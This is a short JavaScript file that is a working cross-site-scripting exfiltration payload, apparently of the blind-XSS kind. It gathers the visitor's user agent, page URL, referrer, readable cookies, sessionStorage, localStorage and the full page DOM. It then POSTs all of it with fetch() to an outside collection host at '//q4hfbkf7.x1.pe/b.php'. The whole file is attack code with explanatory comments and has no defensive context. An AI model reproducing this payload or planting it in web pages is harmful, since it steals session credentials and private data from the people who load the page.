var mhost = '//q4hfbkf7.x1.pe/b.php';
var msg = 'User Agent\n' + navigator.userAgent + '\n\nTarget URL\n' + document.URL;
msg += '\n\nReferer URL\n' + document.referrer + '\n\nReadable Cookies\n' + document.cookie;
msg += '\n\nSession Storage\n' + JSON.stringify(sessionStorage) + '\n\nLocal Storage\n' + JSON.stringify(localStorage);
msg += '\n\nFull DOM\n' + document.documentElement.innerHTML;

// Using fetch API
fetch(mhost, {
    method: 'POST', // Setting method to POST
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded' // Setting Content-Type header
    },
    body: 'origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg) // URL-encoding the message and including it in the body
})
.then(response => response.text()) // Parsing the response to text (optional, depending on what the server responds with)
.then(data => console.log(data)) // Logging the response data (optional, for demonstration purposes)
.catch(error => console.error('Error:', error)); // Handling errors
